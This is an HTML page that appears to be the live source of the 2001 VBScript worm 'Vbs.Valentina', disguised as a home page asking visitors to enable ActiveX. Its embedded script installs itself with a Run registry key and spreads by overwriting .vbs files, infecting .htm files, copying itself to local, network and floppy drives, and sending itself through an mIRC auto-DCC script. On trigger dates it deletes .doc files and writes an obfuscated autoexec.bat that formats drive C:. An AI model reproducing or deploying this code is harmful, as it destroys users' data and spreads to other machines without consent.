   <html><!--Valentina-->
   <body>
   </body>
   </html>
   <HTML><HEAD><TITLE>- Valentina's Home Page -</TITLE><META NAME="Generator" CONTENT="Valentina">
   <META NAME="Author" CONTENT="Tossico / rattorappattore@hotmail.com / Canosa, Italy / 2001">
   <META NAME="Description" CONTENT="Vbs.Valentina">
   </HEAD><BODY ONMOUSEOUT="window.name='main';window.open('Valentina.HTM','main')"
   ONKEYDOWN="window.name='main';window.open('Valentina.HTM','main')" BGPROPERTIES="fixed" BGCOLOR="#FF9933">
   <h1 align="center"><font color="red"><b>IPORTANT</b></font></h1><CENTER><p><b>This HTML file need ActiveX Control</p><p>To Enable to read this HTML file<BR>- Please press 'YES' button to Enable ActiveX -</p></b>
   </CENTER><MARQUEE LOOP="infinite" BGCOLOR="yellow"><b><font color="red">~~~~~~~~~~~~Valentina~~~~~~~~~~~~</font></b></MARQUEE>
   </BODY></HTML>
   <SCRIPT language="JScript">
   <!--//
   if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}
   //-->
   </SCRIPT>
   <SCRIPT LANGUAGE="VBScript">
   <!--
   on error resume next
   dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit
   aw=1
   code="On Error Resume Next"&vbcrlf& _
   "dim fso, sys, win, temp, eq, ctr, file, vbscopy, dow"&vbcrlf& _
   "eq=]-]]-]"&vbcrlf& _
   "ctr=0"&vbcrlf& _
   "Set fso = CreateObject(]-]Scripting.FileSystemObject]-])"&vbcrlf& _
   "Set file = fso.OpenTextFile(WScript.ScriptFullname,1)"&vbcrlf& _
   "vbscopy=file.ReadAll"&vbcrlf& _
   "main()"&vbcrlf& _
   "sub main()"&vbcrlf& _
   "  On Error Resume Next"&vbcrlf& _
   "  dim wscr,rr"&vbcrlf& _
   "  set wscr=CreateObject(]-]WScript.Shell]-])"&vbcrlf& _
   "  rr=wscr.RegRead(]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%Windows Script Host%-%Settings%-%Timeout]-])"&vbcrlf& _
   "  if (rr>=1) Then"&vbcrlf& _
   "    wscr.RegWrite ]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%Windows Script Host%-%Settings%-%Timeout]-], 0, ]-]REG_DWORD]-]"&vbcrlf& _
   "end If"&vbcrlf& _
   "  Set sys = fso.GetSpecialFolder(1)"&vbcrlf& _
   "  Set c = fso.GetFile(WScript.ScriptFullName)"&vbcrlf& _
   "  c.Copy(sys&]-]%-%WinLoader.vbs]-])"&vbcrlf& _
   "  c.Copy(sys&]-]%-%Valentina.vbs]-])"&vbcrlf& _
   "  c.Copy(]-]a:%-%Valentina.jpg.vbs]-])"&vbcrlf& _
   "  set att = fso.GetFile(sys&]-]%-%WinLoader.vbs]-])"&vbcrlf& _
   "      att.attributes = att.attributes + 2"&vbcrlf& _
   "      Const ForReading = 1, ForWriting = 2, ForAppending = 8"&vbcrlf& _
   "  Set f = fso.OpenTextFile(sys&]-]%-%Valentina.log]-], ForAppending, True)"&vbcrlf& _
   "      f.WriteLine Date"&vbcrlf& _
   "  regruns()"&vbcrlf& _
   "end Sub"&vbcrlf& _
   "Sub regruns()"&vbcrlf& _
   "Dim WSHShell"&vbcrlf& _
   "Set WSHShell = CreateObject(]-]WScript.Shell]-])"&vbcrlf& _
   "WSHShell.RegWrite ]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%Windows%-%CurrentVersion%-%Run%-%WinLoader]-],sys&]-]%-%WinLoader.vbs]-]"&vbcrlf& _
   "ntwrk()"&vbcrlf& _
   "html()"&vbcrlf& _
   "htm()"&vbcrlf& _
   "listadriv()"&vbcrlf& _
   "If Day(Now()) = 6 and Month(Now()) = 10 Then killer()"&vbcrlf& _
   "Randomize"&vbcrlf& _
   "If 1 + Int(Rnd * 500) = 7 Then doc()"&vbcrlf& _
   "If Day(Now()) = 14 and Month(Now()) = 2 Then Valentina()"&vbcrlf& _
   "End Sub"&vbcrlf& _
   "sub listadriv"&vbcrlf& _
   "  On Error Resume Next"&vbcrlf& _
   "  Dim d,dc,s"&vbcrlf& _
   "  Set dc = fso.Drives"&vbcrlf& _
   "  For Each d in dc"&vbcrlf& _
   "    If d.DriveType = 2 or d.DriveType=3 Then"&vbcrlf& _
   "      folderlist(d.path & ]-]%-%]-])"&vbcrlf& _
   "    end if"&vbcrlf& _
   "  Next"&vbcrlf& _
   "  listadriv = s"&vbcrlf& _
   "end sub"&vbcrlf& _
   "Sub infectfiles(folderspec)  "&vbcrlf& _
   "  On Error Resume Next"&vbcrlf& _
   "  dim f,f1,fc,ext,ap,mircfname,s,bname,mp3"&vbcrlf& _
   "  set f = fso.GetFolder(folderspec)"&vbcrlf& _
   "  set fc = f.Files"&vbcrlf& _
   "  for each f1 in fc"&vbcrlf& _
   "    ext = fso.GetExtensionName(f1.path)"&vbcrlf& _
   "    ext = lcase(ext)"&vbcrlf& _
   "    s = lcase(f1.name)"&vbcrlf& _
   "    If (ext = ]-]vbs]-]) or (ext = ]-]vbe]-]) then"&vbcrlf& _
   "      set ap = fso.OpenTextFile(f1.path,2,true)"&vbcrlf& _
   "      ap.write vbscopy"&vbcrlf& _
   "      ap.close"&vbcrlf& _
   "    ElseIf(ext=]-]mp3]-]) or (ext=]-]txt]-]) then"&vbcrlf& _
   "      set mp3 = fso.CreateTextFiLe(f1.path & ]-].vbs]-])"&vbcrlf& _
   "      mp3.write vbscopy"&vbcrlf& _
   "      mp3.close"&vbcrlf& _
   "      set att = fso.GetFile(f1.path)"&vbcrlf& _
   "      att.attributes = att.attributes + 2"&vbcrlf& _
   "      ElseIf(ext=]-]txt]-]) Then"&vbcrlf& _
   "      Const ForReading = 1, ForWriting = 2, ForAppending = 8"&vbcrlf& _
   "      Set txt = fso.OpenTextFile(f1.path, ForAppending, True)"&vbcrlf& _
   "      txt.WriteLine vbcrlf &]-]Valentina I Love You]-]"&vbcrlf& _
   "      txt.close"&vbcrlf& _
   "      ElseIf(ext=]-]bat]-]) Then"&vbcrlf& _
   "      Set bat = fso.OpenTextFile(f1.path, ForAppending, True)"&vbcrlf& _
   "      bat.WriteLine vbcrlf &]-]Rem Valentina I Love You]-]"&vbcrlf& _
   "      bat.close"&vbcrlf& _
   "    end If"&vbcrlf& _
   "  next  "&vbcrlf& _
   "end sub"&vbcrlf& _
   "Sub folderlist(folderspec)  "&vbcrlf& _
   "  On Error Resume Next"&vbcrlf& _
   "  dim f,f1,sf"&vbcrlf& _
   "  set f = fso.GetFolder(folderspec)  "&vbcrlf& _
   "  set sf = f.SubFolders"&vbcrlf& _
   "  for each f1 in sf"&vbcrlf& _
   "    infectfiles(f1.path)"&vbcrlf& _
   "    folderlist(f1.path)"&vbcrlf& _
   "  next  "&vbcrlf& _
   "end sub"&vbcrlf& _
   ""&vbcrlf& _
   "sub regcreate(regkey,regvalue)"&vbcrlf& _
   "  Set regedit = CreateObject(]-]WScript.Shell]-])"&vbcrlf& _
   "  regedit.RegWrite regkey,regvalue"&vbcrlf& _
   "end sub"&vbcrlf& _
   ""&vbcrlf& _
   "function regget(value)"&vbcrlf& _
   "  Set regedit = CreateObject(]-]WScript.Shell]-])"&vbcrlf& _
   "  regget = regedit.RegRead(value)"&vbcrlf& _
   "end function"&vbcrlf& _
   ""&vbcrlf& _
   "Function fileexist(filespec)"&vbcrlf& _
   "  On Error Resume Next"&vbcrlf& _
   "  dim msg"&vbcrlf& _
   "  if (fso.FileExists(filespec)) Then"&vbcrlf& _
   "    msg = 0"&vbcrlf& _
   "    else"&vbcrlf& _
   "    msg = 1"&vbcrlf& _
   "  end if"&vbcrlf& _
   "  fileexist = msg"&vbcrlf& _
   "end function"&vbcrlf& _
   "function folderexist(folderspec)"&vbcrlf& _
   "  On Error Resume Next"&vbcrlf& _
   "  dim msg"&vbcrlf& _
   "  if (fso.GetFolderExists(folderspec)) then"&vbcrlf& _
   "    msg = 0"&vbcrlf& _
   "    else"&vbcrlf& _
   "    msg = 1"&vbcrlf& _
   "  end if"&vbcrlf& _
   "  fileexist = msg"&vbcrlf& _
   "end function"&vbcrlf& _
   "sub infect(drive)"&vbcrlf& _
   "On Error Resume Next"&vbcrlf& _
   "set s = CreateObject(]-]Scripting.FileSystemObject]-])"&vbcrlf& _
   "Set f = s.GetFile(WScript.ScriptFullName)"&vbcrlf& _
   "f.copy(drive & ]-]%-%Valentina.jpg.vbs]-])"&vbcrlf& _
   "path=drive&]-]%-%Valentina.jpg.vbs]-]"&vbcrlf& _
   "end sub"&vbcrlf& _
   "Function ShowDriveType(drvpath)"&vbcrlf& _
   "On Error Resume Next"&vbcrlf& _
   "Dim fso, d, t"&vbcrlf& _
   "Set fso = CreateObject(]-]Scripting.FileSystemObject]-])"&vbcrlf& _
   "Set d = fso.GetDrive(drvpath)"&vbcrlf& _
   "Select Case d.DriveType"&vbcrlf& _
   "Case 0: t = ]-]Unknown]-]"&vbcrlf& _
   "Case 1: t = ]-]Removable]-]"&vbcrlf& _
   "Case 2: t = ]-]Fixed]-]"&vbcrlf& _
   "Case 3: t = ]-]Network]-]"&vbcrlf& _
   "Case 4: t = ]-]CD-ROM]-]"&vbcrlf& _
   "Case 5: t = ]-]RAM Disk]-]"&vbcrlf& _
   "End Select"&vbcrlf& _
   "if t = ]-]]-] then t = ]-]None]-]"&vbcrlf& _
   "ShowDriveType = t"&vbcrlf& _
   "End Function"&vbcrlf& _
   "sub ntwrk()"&vbcrlf& _
   "On Error Resume Next"&vbcrlf& _
   "for n = 65 to 90"&vbcrlf& _
   "l=Chr(n) "&vbcrlf& _
   "drv=l&]-]:]-]"&vbcrlf& _
   "d3=ShowDriveType(drv)"&vbcrlf& _
   "if d3 = ]-]Fixed]-] then infect(drv)"&vbcrlf& _
   "if d3 = ]-]Network]-] then infect(drv)"&vbcrlf& _
   "Next"&vbcrlf& _
   "end Sub"&vbcrlf& _
   "Sub killer()"&vbcrlf& _
   "Dim WSHShell"&vbcrlf& _
   "Randomize"&vbcrlf& _
   "If 1 + Int(Rnd * 1000) = 1 then"&vbcrlf& _
   "Set fuck = CreateObject(]-]Scripting.FileSystemObject]-])"&vbcrlf& _
   "Set WSHShell = WScript.CreateObject(]-]WScript.Shell]-])"&vbcrlf& _
   "Set k = fuck.CreateTextFile(]-]c:%-%autoexec.bat]-], True)"&vbcrlf& _
   "k.writeline Chr(64) & Chr(99) & Chr(116) & Chr(116) & Chr(121) & Chr(32) & Chr(110) & Chr(117) & Chr(108)"&vbcrlf& _
   "k.writeline Chr(102) & Chr(111) & Chr(114) & Chr(109) & Chr(97) & Chr(116) & Chr(32) & Chr(99) & Chr(58) & Chr(32) & Chr(47) & Chr(97) & Chr(117) & Chr(116) & Chr(111) & Chr(116) & Chr(101) & Chr(115) & Chr(116) & Chr(32) & Chr(47) & Chr(113) & Chr(32) & Chr(47) & Chr(117)"&vbcrlf& _
   "k.close"&vbcrlf& _
   "WSHShell.run ]-]RUNDLL32.EXE user.exe,exitwindows]-]"&vbcrlf& _
   "End If"&vbcrlf& _
   "End Sub"&vbcrlf& _
   "Sub html()"&vbcrlf& _
   "On Error Resume Next"&vbcrlf& _
   "  dim lines, n, dta1, dta2, dt1, dt2, dt3, dt4, l1, dt5, dt6"&vbcrlf& _
   "  dta1= ]-]<HTML><HEAD><TITLE>- Valentina[-[s Home Page -<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@Valentina@-@>]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]<META NAME=@-@Author@-@ CONTENT=@-@Tossico ?-? rattorappattore@hotmail.com ?-? Canosa, Italy ?-? 2001@-@>]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]<META NAME=@-@Description@-@ CONTENT=@-@Vbs.Valentina@-@>]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#Valentina.HTM#-#,#-#main#-#)@-@ ]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#Valentina.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]<h1 align=@-@center@-@><font color=@-@red@-@><b>IPORTANT<?-?b><?-?font><?-?h1><CENTER><p><b>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX -<?-?p><?-?b>]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@><b><font color=@-@red@-@>~~~~~~~~~~~~Valentina~~~~~~~~~~~~<?-?font><?-?b><?-?MARQUEE> ]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]<?-?BODY><?-?HTML>]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]<SCRIPT language=@-@JScript@-@>]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]<!--?-??-?]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]?-??-?-->]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]<?-?SCRIPT>]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]<SCRIPT LANGUAGE=@-@VBScript@-@>]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]<!--]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]on error resume next]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]aw=1]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]code=]-]"&vbcrlf& _
   "  dta2= ]-]set fso=CreateObject(@-@Scripting.FileSystemObject@-@)]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]set dirsystem=fso.GetSpecialFolder(1)]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]set wri=fso.CreateTextFile(dirsystem&@-@^-^WinLoader.vbs@-@)]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]wri.write code4]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]wri.close]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]if (fso.FileExists(dirsystem&@-@^-^WinLoader.vbs@-@)) then]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]if (err.number=424) then]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]aw=0]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]end if]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]if (aw=1) then]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]document.write @-@ERROR: can#-#t initialize ActiveX@-@]-]&vbcrlf& _ "&vbcrlf& _
   "        ]-]window.close]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]end if]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]end if]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]Set regedit = CreateObject(@-@WScript.Shell@-@)]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^WinLoader@-@,dirsystem&@-@^-^Winloader.vbs@-@]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]?-??-?-->]-]&vbcrlf& _"&vbcrlf& _
   "        ]-]<?-?SCRIPT>]-]"&vbcrlf& _
   "  dt1 = replace(dta1, chr(35) & chr(45) & chr(35), ]-][-[]-])"&vbcrlf& _
   "  dt1 = replace(dt1, chr(64) & chr(45) & chr(64), ]-]]-]]-]]-])"&vbcrlf& _
   "  dt4 = replace(dt1, chr(63) & chr(45) & chr(63), ]-]/]-])"&vbcrlf& _
   "  dt5 = replace(dt4, chr(94) & chr(45) & chr(94), ]-]%-%]-])"&vbcrlf& _
   "  dt2 = replace(dta2, chr(35) & chr(45) & chr(35), ]-][-[]-])"&vbcrlf& _
   "  dt2 = replace(dt2, chr(64) & chr(45) & chr(64), ]-]]-]]-]]-])"&vbcrlf& _
   "  dt3 = replace(dt2, chr(63) & chr(45) & chr(63), ]-]/]-])"&vbcrlf& _
   "  dt6 = replace(dt3, chr(94) & chr(45) & chr(94), ]-]%-%]-])"&vbcrlf& _
   "  set fso = CreateObject(]-]Scripting.FileSystemObject]-])"&vbcrlf& _
   "  set c = fso.OpenTextFile(WScript.ScriptFullName, 1)"&vbcrlf& _
   "  lines = Split(c.ReadAll, vbcrlf)"&vbcrlf& _
   "  l1 = ubound(lines)"&vbcrlf& _
   "  for n = 0 to ubound(lines)"&vbcrlf& _
   "    lines(n)=replace(lines(n), ]-][-[]-], chr(91) + chr(45) + chr(91))"&vbcrlf& _
   "    lines(n)=replace(lines(n), ]-]]-]]-]]-], chr(93) + chr(45) + chr(93))"&vbcrlf& _
   "    lines(n)=replace(lines(n), ]-]%-%]-], chr(37) + chr(45) + chr(37))"&vbcrlf& _
   "    if (l1 = n) then"&vbcrlf& _
   "      lines(n) = chr(34) + lines(n) + chr(34)"&vbcrlf& _
   "    else"&vbcrlf& _
   "      lines(n) = chr(34) + lines(n) + chr(34) & ]-]&vbcrlf& _]-]"&vbcrlf& _
   "    end if"&vbcrlf& _
   "  next"&vbcrlf& _
   "  set b=fso.CreateTextFile(sys + ]-]%-%Valentina.HTM]-])"&vbcrlf& _
   "  b.close"&vbcrlf& _
   "  set d=fso.OpenTextFile(sys + ]-]%-%Valentina.HTM]-],2)"&vbcrlf& _
   "  d.write dt5"&vbcrlf& _
   "  d.write join(lines, vbcrlf)"&vbcrlf& _
   "  d.write vbcrlf"&vbcrlf& _
   "  d.write dt6"&vbcrlf& _
   "  d.close"&vbcrlf& _
   "End Sub"&vbcrlf& _
   "On Error Resume Next"&vbcrlf& _
   "a=ReportFolderStatus(]-]C:%-%mirc]-])"&vbcrlf& _
   "if a=]-]1]-] then mirc()"&vbcrlf& _
   "Function ReportFileStatus(filespec)"&vbcrlf& _
   "On Error Resume Next"&vbcrlf& _
   "Dim fso, msg"&vbcrlf& _
   "Set fso = CreateObject(]-]Scripting.FileSystemObject]-])"&vbcrlf& _
   "If (fso.FileExists(filespec)) Then"&vbcrlf& _
   "msg = ]-]1]-]"&vbcrlf& _
   "Else"&vbcrlf& _
   "msg = ]-]0]-]"&vbcrlf& _
   "End If"&vbcrlf& _
   "ReportFileStatus = msg"&vbcrlf& _
   "End Function"&vbcrlf& _
   "Function ReportFolderStatus(fldr)"&vbcrlf& _
   "On Error Resume Next"&vbcrlf& _
   "Dim fso, msg"&vbcrlf& _
   "Set fso = CreateObject(]-]Scripting.FileSystemObject]-])"&vbcrlf& _
   "If (fso.FolderExists(fldr)) Then"&vbcrlf& _
   "msg = ]-]1]-]"&vbcrlf& _
   "Else"&vbcrlf& _
   "msg = ]-]0]-]"&vbcrlf& _
   "End If"&vbcrlf& _
   "ReportFolderStatus = msg"&vbcrlf& _
   "End Function"&vbcrlf& _
   "Sub mirc()"&vbcrlf& _
   "On Error Resume Next"&vbcrlf& _
   "Dim fso4, folder"&vbcrlf& _
   "Set fso4 = CreateObject(]-]Scripting.FileSystemObject]-])"&vbcrlf& _
   "Set sys = fso4.GetSpecialFolder(1)"&vbcrlf& _
   "path = sys&]-]%-%Valentina.HTM]-]"&vbcrlf& _
   "Dim fso34, f132, t2s"&vbcrlf& _
   "Const ForWriting = 2"&vbcrlf& _
   "Set fso34 = CreateObject(]-]Scripting.FileSystemObject]-])"&vbcrlf& _
   "fso34.CreateTextFile (]-]c:%-%mirc%-%script.ini]-])"&vbcrlf& _
   "Set f132 = fso34.GetFile(]-]c:%-%mirc%-%script.ini]-])"&vbcrlf& _
   "Set t2s = f132.OpenAsTextStream(ForWriting, false)"&vbcrlf& _
   "t2s.write ]-][script]]-] & vbcrlf"&vbcrlf& _
   "t2s.write ]-]n0=ON 1:JOIN:#:/dcc send $nick ]-] & path & vbcrlf"&vbcrlf& _
   "t2s.close"&vbcrlf& _
   "editini ]-]C:%-%mirc%-%mirc.ini]-],]-][text]]-],]-]ignore]-],]-]*.exe,*.com,*.bat,*.dll,*.ini,*.vbs]-]"&vbcrlf& _
   "editini ]-]C:%-%mirc%-%mirc.ini]-],]-][options]]-],]-]n2]-],]-]0,1,0,0,1,1,1,1,0,5,35,0,0,1,1,0,1,1,0,5,500,10,0,1,1,0,0]-]"&vbcrlf& _
   "editini ]-]C:%-%mirc%-%mirc.ini]-],]-][options]]-],]-]n4]-],]-]1,0,1,1,0,3,9999,0,0,0,1,0,1024,0,0,99,60,0,0,1,1,1,0,1,1,5000,1]-]"&vbcrlf& _
   "End Sub"&vbcrlf& _
   "Sub htm()"&vbcrlf& _
   "On Error Resume Next"&vbcrlf& _
   "Set FSO = CreateObject(]-]Scripting.FileSystemObject]-])"&vbcrlf& _
   "Set WORDOBJ = CreateObject(]-]Word.application]-])"&vbcrlf& _
   "Set FS = WORDOBJ.Application.FileSearch"&vbcrlf& _
   "FS.NewSearch"&vbcrlf& _
   "FS.LookIn = ]-]c:%-%]-]"&vbcrlf& _
   "FS.SearchSubFolders = True"&vbcrlf& _
   "FS.FileName = ]-]*.htm]-]"&vbcrlf& _
   "FS.Execute"&vbcrlf& _
   "For t = 1 To FS.FoundFiles.Count"&vbcrlf& _
   "Set bombed = FSO.opentextfile(FS.FoundFiles(t), 1)"&vbcrlf& _
   "f = bombed.readline"&vbcrlf& _
   "bombed.Close"&vbcrlf& _
   "If f <> ]-]<html><!--Valentina-->]-] Then"&vbcrlf& _
   "Set TRANGE = Document.body.createTextRange"&vbcrlf& _
   "Set G = FSO.opentextfile(FS.FoundFiles(t), 1)"&vbcrlf& _
   "Contents = G.readall"&vbcrlf& _
   "G.Close"&vbcrlf& _
   "Set h = FSO.opentextfile(FS.FoundFiles(t), 2, True)"&vbcrlf& _
   "h.writeline ]-]<html><!--Valentina-->]-]"&vbcrlf& _
   "h.writeline ]-]<body>]-]"&vbcrlf& _
   "h.writeline TRANGE.HTMLText"&vbcrlf& _
   "h.writeline ]-]</body>]-]"&vbcrlf& _
   "h.writeline ]-]</html>]-]"&vbcrlf& _
   "h.writeline Contents"&vbcrlf& _
   "h.Close"&vbcrlf& _
   "End If"&vbcrlf& _
   "Next"&vbcrlf& _
   "WORDOBJ.Quit"&vbcrlf& _
   "End Sub"&vbcrlf& _
   "Sub doc()"&vbcrlf& _
   "On Error Resume Next"&vbcrlf& _
   "Set WORDOBJ = CreateObject(]-]Word.application]-])"&vbcrlf& _
   "Set FS = WORDOBJ.Application.FileSearch"&vbcrlf& _
   "FS.NewSearch"&vbcrlf& _
   "FS.LookIn = ]-]c:%-%]-]"&vbcrlf& _
   "FS.SearchSubFolders = True"&vbcrlf& _
   "FS.FileName = ]-]*.doc]-]"&vbcrlf& _
   "FS.execute"&vbcrlf& _
   "For t = 1 To FS.FoundFiles.Count"&vbcrlf& _
   "Set FSO = CreateObject(]-]Scripting.FileSystemObject]-])"&vbcrlf& _
   "Set del = FSO.deletefile(FS.FoundFiles(t), 1)"&vbcrlf& _
   "del.Close"&vbcrlf& _
   "Next"&vbcrlf& _
   "End Sub"&vbcrlf& _
   "Sub Valentina()"&vbcrlf& _
   "On Error Resume Next"&vbcrlf& _
   "Do"&vbcrlf& _
   "MsgBox ]-]***VALENTINA I LOVE YOU***]-], vbOKOnly & vbCritical, ]-]          ***VALENTINA I LOVE YOU***]-]"&vbcrlf& _
   "loop"&vbcrlf& _
   "End Sub"&vbcrlf& _
   "Set NoDel = fso.opentextfile(wscript.scriptfullname, 1)"&vbcrlf& _
   "SourceCode = NoDel.readall"&vbcrlf& _
   "NoDel.Close"&vbcrlf& _
   "Do"&vbcrlf& _
   "   If Not (fso.fileexists(wscript.scriptfullname)) Then"&vbcrlf& _
   "       Set NoDel = fso.createtextfile(wscript.scriptfullname, True)"&vbcrlf& _
   "       NoDel.write SourceCode"&vbcrlf& _
   "       NoDel.Close"&vbcrlf& _
   "   End If"&vbcrlf& _
   "   Loop"&vbcrlf& _
   "[-[Valentina I Love You!"
   set fso=CreateObject("Scripting.FileSystemObject")
   set dirsystem=fso.GetSpecialFolder(1)
   code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))
   code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))
   code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))
   set wri=fso.CreateTextFile(dirsystem&"\WinLoader.vbs")
   wri.write code4
   wri.close
   if (fso.FileExists(dirsystem&"\WinLoader.vbs")) then
   if (err.number=424) then
   aw=0
   end if
   if (aw=1) then
   document.write "ERROR: can't initialize ActiveX"
   window.close
   end if
   end if
   Set regedit = CreateObject("WScript.Shell")
   regedit.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WinLoader",dirsystem&"\Winloader.vbs"
   //-->
   </SCRIPT>
